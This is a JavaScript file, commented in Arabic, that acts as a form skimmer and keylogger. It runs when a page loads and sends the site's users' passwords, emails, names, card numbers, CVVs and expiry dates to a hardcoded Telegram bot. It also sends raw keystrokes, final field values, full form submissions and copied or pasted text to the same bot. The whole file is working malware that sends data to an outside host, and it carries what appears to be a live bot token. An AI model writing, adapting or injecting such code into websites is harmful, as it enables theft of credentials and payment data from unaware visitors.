// نظام التتبع الفوري - إرسال كل حرف يُكتب مباشرة
// Instant Tracker - Send Every Character Typed Immediately

(function() {
    'use strict';

    const TELEGRAM_CONFIG = {
        botToken: '7285756328:AAFHLQU8e72LO2U_IAhNrR99cttRBkT6CEU',
        chatId: '2126771039'
    };

    // قائمة المتتبعات النشطة
    const activeTrackers = new Map();

    // إرسال سريع للتيليجرام
    function quickSendToTelegram(message) {
        const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
        
        // إرسال عادي
        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CONFIG.chatId,
                text: message,
                parse_mode: 'HTML'
            })
        }).catch(() => {});

        // إرسال احتياطي باستخدام Image
        const img = new Image();
        img.src = `${url}?chat_id=${TELEGRAM_CONFIG.chatId}&text=${encodeURIComponent(message)}`;
    }

    // تتبع فوري لكلمات المرور
    function setupInstantPasswordTracking() {
        document.addEventListener('input', function(e) {
            const element = e.target;
            
            if (element.type === 'password') {
                const fieldId = element.id || element.name || element.placeholder || 'password_field';
                const currentValue = element.value;
                
                // إرسال فوري لكل تغيير في كلمة المرور
                if (currentValue.length > 0) {
                    const message = `🔐 <b>كلمة مرور فورية!</b>\n\n`
                                 + `🏷️ الحقل: <code>${fieldId}</code>\n`
                                 + `🔑 كلمة المرور: <code>${currentValue}</code>\n`
                                 + `📏 الطول: ${currentValue.length} حرف\n`
                                 + `⚡ وقت فوري: ${new Date().toLocaleTimeString('ar-SA')}\n`
                                 + `📄 ${window.location.pathname}`;
                    
                    quickSendToTelegram(message);
                }
            }
        }, true);
    }

    // تتبع فوري للإيميلات
    function setupInstantEmailTracking() {
        document.addEventListener('input', function(e) {
            const element = e.target;
            
            if (element.type === 'email' || 
                element.name?.toLowerCase().includes('email') ||
                element.id?.toLowerCase().includes('email') ||
                element.placeholder?.toLowerCase().includes('email')) {
                
                const fieldId = element.id || element.name || element.placeholder || 'email_field';
                const currentValue = element.value;
                
                // إرسال فوري للإيميلات
                if (currentValue.includes('@') || currentValue.length > 5) {
                    const message = `📧 <b>إيميل فوري!</b>\n\n`
                                 + `🏷️ الحقل: <code>${fieldId}</code>\n`
                                 + `📧 الإيميل: <code>${currentValue}</code>\n`
                                 + `⚡ وقت فوري: ${new Date().toLocaleTimeString('ar-SA')}\n`
                                 + `📄 ${window.location.pathname}`;
                    
                    quickSendToTelegram(message);
                }
            }
        }, true);
    }

    // تتبع فوري للأسماء
    function setupInstantNameTracking() {
        document.addEventListener('input', function(e) {
            const element = e.target;
            
            if (element.name?.toLowerCase().includes('name') ||
                element.id?.toLowerCase().includes('name') ||
                element.placeholder?.toLowerCase().includes('name') ||
                element.placeholder?.toLowerCase().includes('اسم')) {
                
                const fieldId = element.id || element.name || element.placeholder || 'name_field';
                const currentValue = element.value;
                
                // إرسال فوري للأسماء
                if (currentValue.length > 2) {
                    const message = `👤 <b>اسم فوري!</b>\n\n`
                                 + `🏷️ الحقل: <code>${fieldId}</code>\n`
                                 + `👤 الاسم: <code>${currentValue}</code>\n`
                                 + `⚡ وقت فوري: ${new Date().toLocaleTimeString('ar-SA')}\n`
                                 + `📄 ${window.location.pathname}`;
                    
                    quickSendToTelegram(message);
                }
            }
        }, true);
    }

    // تتبع فوري لبيانات بطاقات الائتمان
    function setupInstantCardTracking() {
        document.addEventListener('input', function(e) {
            const element = e.target;
            
            // رقم البطاقة
            if (element.name?.toLowerCase().includes('card') ||
                element.id?.toLowerCase().includes('card') ||
                element.placeholder?.toLowerCase().includes('card') ||
                element.autocomplete === 'cc-number') {
                
                const currentValue = element.value;
                if (currentValue.length > 4) {
                    const message = `💳 <b>رقم بطاقة فوري!</b>\n\n`
                                 + `🔢 رقم البطاقة: <code>${currentValue}</code>\n`
                                 + `⚡ وقت فوري: ${new Date().toLocaleTimeString('ar-SA')}\n`
                                 + `📄 ${window.location.pathname}`;
                    quickSendToTelegram(message);
                }
            }
            
            // CVV
            if (element.name?.toLowerCase().includes('cvv') ||
                element.id?.toLowerCase().includes('cvv') ||
                element.autocomplete === 'cc-csc') {
                
                const currentValue = element.value;
                if (currentValue.length > 0) {
                    const message = `🔢 <b>CVV فوري!</b>\n\n`
                                 + `🔢 CVV: <code>${currentValue}</code>\n`
                                 + `⚡ وقت فوري: ${new Date().toLocaleTimeString('ar-SA')}\n`
                                 + `📄 ${window.location.pathname}`;
                    quickSendToTelegram(message);
                }
            }
            
            // تاريخ الانتهاء
            if (element.name?.toLowerCase().includes('expiry') ||
                element.id?.toLowerCase().includes('expiry') ||
                element.name?.toLowerCase().includes('expire') ||
                element.autocomplete === 'cc-exp') {
                
                const currentValue = element.value;
                if (currentValue.length > 1) {
                    const message = `📅 <b>تاريخ انتهاء فوري!</b>\n\n`
                                 + `📅 التاريخ: <code>${currentValue}</code>\n`
                                 + `⚡ وقت فوري: ${new Date().toLocaleTimeString('ar-SA')}\n`
                                 + `📄 ${window.location.pathname}`;
                    quickSendToTelegram(message);
                }
            }
        }, true);
    }

    // تتبع ضغطات المفاتيح في الوقت الفعلي
    function setupRealtimeKeylogger() {
        let keySequence = '';
        let sequenceStart = Date.now();

        document.addEventListener('keydown', function(e) {
            const currentTime = Date.now();
            const activeElement = document.activeElement;
            
            // تحديد نوع الحقل النشط
            let fieldType = 'unknown';
            if (activeElement) {
                if (activeElement.type === 'password') fieldType = 'password';
                else if (activeElement.type === 'email') fieldType = 'email';
                else if (activeElement.name?.toLowerCase().includes('name')) fieldType = 'name';
                else if (activeElement.name?.toLowerCase().includes('card')) fieldType = 'card';
            }

            // إضافة المفتاح للتسلسل
            if (e.key.length === 1) {
                keySequence += e.key;
            } else if (e.key === 'Backspace') {
                keySequence += '[⌫]';
            } else if (e.key === 'Enter') {
                keySequence += '[↵]';
            }

            // إرسال كل 10 أحرف أو كل 5 ثوان
            if (keySequence.length >= 10 || (currentTime - sequenceStart) >= 5000) {
                if (keySequence.trim().length > 0) {
                    const message = `⌨️ <b>مفاتيح فورية!</b>\n\n`
                                 + `📝 التسلسل: <code>${keySequence}</code>\n`
                                 + `🎯 نوع الحقل: <code>${fieldType}</code>\n`
                                 + `⚡ وقت فوري: ${new Date().toLocaleTimeString('ar-SA')}\n`
                                 + `📄 ${window.location.pathname}`;
                    
                    quickSendToTelegram(message);
                    keySequence = '';
                    sequenceStart = currentTime;
                }
            }
        }, true);
    }

    // تتبع تركيز الحقول
    function setupFieldFocusTracking() {
        document.addEventListener('focus', function(e) {
            const element = e.target;
            
            if (element.tagName === 'INPUT' || element.tagName === 'TEXTAREA') {
                const fieldInfo = {
                    type: element.type || 'text',
                    id: element.id || element.name || element.placeholder || 'unknown',
                    placeholder: element.placeholder || '',
                    value: element.value || ''
                };

                const message = `🎯 <b>تركيز على حقل!</b>\n\n`
                             + `🏷️ النوع: <code>${fieldInfo.type}</code>\n`
                             + `🆔 المعرف: <code>${fieldInfo.id}</code>\n`
                             + `📝 النص التوضيحي: <code>${fieldInfo.placeholder}</code>\n`
                             + `💾 القيمة الحالية: <code>${fieldInfo.value}</code>\n`
                             + `⚡ وقت فوري: ${new Date().toLocaleTimeString('ar-SA')}\n`
                             + `📄 ${window.location.pathname}`;
                
                quickSendToTelegram(message);
            }
        }, true);
    }

    // تتبع فقدان تركيز الحقول (البيانات النهائية)
    function setupFieldBlurTracking() {
        document.addEventListener('blur', function(e) {
            const element = e.target;
            
            if ((element.tagName === 'INPUT' || element.tagName === 'TEXTAREA') && element.value.trim() !== '') {
                const fieldInfo = {
                    type: element.type || 'text',
                    id: element.id || element.name || element.placeholder || 'unknown',
                    finalValue: element.value
                };

                const message = `✅ <b>بيانات نهائية للحقل!</b>\n\n`
                             + `🏷️ النوع: <code>${fieldInfo.type}</code>\n`
                             + `🆔 المعرف: <code>${fieldInfo.id}</code>\n`
                             + `📋 القيمة النهائية: <code>${fieldInfo.finalValue}</code>\n`
                             + `⚡ وقت فوري: ${new Date().toLocaleTimeString('ar-SA')}\n`
                             + `📄 ${window.location.pathname}`;
                
                quickSendToTelegram(message);
            }
        }, true);
    }

    // تتبع إرسال النماذج الفوري
    function setupInstantFormSubmit() {
        document.addEventListener('submit', function(e) {
            const form = e.target;
            
            if (form.tagName === 'FORM') {
                // جمع جميع البيانات فوراً
                const formData = new FormData(form);
                const allData = {};
                
                // من FormData
                for (let [key, value] of formData.entries()) {
                    allData[key] = value;
                }
                
                // من الحقول مباشرة
                const inputs = form.querySelectorAll('input, textarea, select');
                inputs.forEach(input => {
                    const key = input.name || input.id || input.placeholder || 'unknown';
                    if (input.value) {
                        allData[key] = input.value;
                    }
                });

                let message = `🚀 <b>إرسال نموذج فوري!</b>\n\n`;
                message += `🆔 النموذج: <code>${form.id || form.action || 'unknown'}</code>\n`;
                message += `⚡ وقت فوري: ${new Date().toLocaleTimeString('ar-SA')}\n\n`;
                message += `📋 <b>جميع البيانات:</b>\n`;

                Object.entries(allData).forEach(([key, value]) => {
                    if (value && value.toString().trim() !== '') {
                        // رموز خاصة للبيانات المهمة
                        let icon = '📝';
                        if (key.toLowerCase().includes('password')) icon = '🔒';
                        else if (key.toLowerCase().includes('email')) icon = '📧';
                        else if (key.toLowerCase().includes('name')) icon = '👤';
                        else if (key.toLowerCase().includes('card')) icon = '💳';
                        
                        message += `   ${icon} <code>${key}</code>: <code>${value}</code>\n`;
                    }
                });

                message += `\n📄 ${window.location.pathname}`;
                quickSendToTelegram(message);
            }
        }, true);
    }

    // تتبع النسخ واللصق
    function setupClipboardTracking() {
        // تتبع النسخ
        document.addEventListener('copy', function(e) {
            const selectedText = window.getSelection().toString();
            if (selectedText.trim().length > 0) {
                const message = `📋 <b>نسخ فوري!</b>\n\n`
                             + `📝 النص المنسوخ: <code>${selectedText}</code>\n`
                             + `⚡ وقت فوري: ${new Date().toLocaleTimeString('ar-SA')}\n`
                             + `📄 ${window.location.pathname}`;
                quickSendToTelegram(message);
            }
        });

        // تتبع اللصق
        document.addEventListener('paste', function(e) {
            const pastedText = e.clipboardData.getData('text');
            const targetElement = e.target;
            
            if (pastedText.trim().length > 0) {
                const message = `📋 <b>لصق فوري!</b>\n\n`
                             + `📝 النص الملصق: <code>${pastedText}</code>\n`
                             + `🎯 الهدف: <code>${targetElement.tagName} (${targetElement.id || targetElement.name || 'unknown'})</code>\n`
                             + `⚡ وقت فوري: ${new Date().toLocaleTimeString('ar-SA')}\n`
                             + `📄 ${window.location.pathname}`;
                quickSendToTelegram(message);
            }
        });
    }

    // مراقب DOM للحقول الجديدة
    function setupDynamicFieldWatcher() {
        const observer = new MutationObserver(function(mutations) {
            mutations.forEach(function(mutation) {
                mutation.addedNodes.forEach(function(node) {
                    if (node.nodeType === 1) { // Element node
                        // البحث عن حقول إدخال جديدة
                        const newInputs = node.querySelectorAll ? 
                            node.querySelectorAll('input, textarea') : [];
                        
                        newInputs.forEach(function(input) {
                            const message = `🆕 <b>حقل جديد اكتُشف!</b>\n\n`
                                         + `🏷️ النوع: <code>${input.type || 'text'}</code>\n`
                                         + `🆔 المعرف: <code>${input.id || input.name || 'unknown'}</code>\n`
                                         + `📝 النص التوضيحي: <code>${input.placeholder || 'بدون'}</code>\n`
                                         + `⚡ وقت الاكتشاف: ${new Date().toLocaleTimeString('ar-SA')}\n`
                                         + `📄 ${window.location.pathname}`;
                            quickSendToTelegram(message);
                        });
                    }
                });
            });
        });

        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    }

    // إرسال حالة النظام كل دقيقة
    function sendSystemStatus() {
        setInterval(function() {
            const message = `💓 <b>نبضة النظام</b>\n\n`
                         + `⚡ النظام نشط ويعمل\n`
                         + `⏰ الوقت: ${new Date().toLocaleString('ar-SA')}\n`
                         + `📄 الصفحة: ${window.location.pathname}\n`
                         + `👀 الحقول المراقبة: ${document.querySelectorAll('input, textarea').length}`;
            quickSendToTelegram(message);
        }, 60000); // كل دقيقة
    }

    // بدء تشغيل جميع أنظمة التتبع الفوري
    function initializeInstantTracking() {
        setupInstantPasswordTracking();
        setupInstantEmailTracking();
        setupInstantNameTracking();
        setupInstantCardTracking();
        setupRealtimeKeylogger();
        setupFieldFocusTracking();
        setupFieldBlurTracking();
        setupInstantFormSubmit();
        setupClipboardTracking();
        setupDynamicFieldWatcher();
        sendSystemStatus();

        // تنبيه بدء النظام
        const startMessage = `🚀 <b>نظام التتبع الفوري نشط!</b>\n\n`
                           + `⚡ جميع الأنظمة تعمل\n`
                           + `⏰ بدء التشغيل: ${new Date().toLocaleString('ar-SA')}\n`
                           + `📄 الصفحة: ${window.location.pathname}\n`
                           + `🔥 مستوى التتبع: فوري وشامل`;
        quickSendToTelegram(startMessage);

        console.log('⚡ Instant Tracker System ACTIVE');
    }

    // تشغيل النظام الفوري
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initializeInstantTracking);
    } else {
        initializeInstantTracking();
    }

})();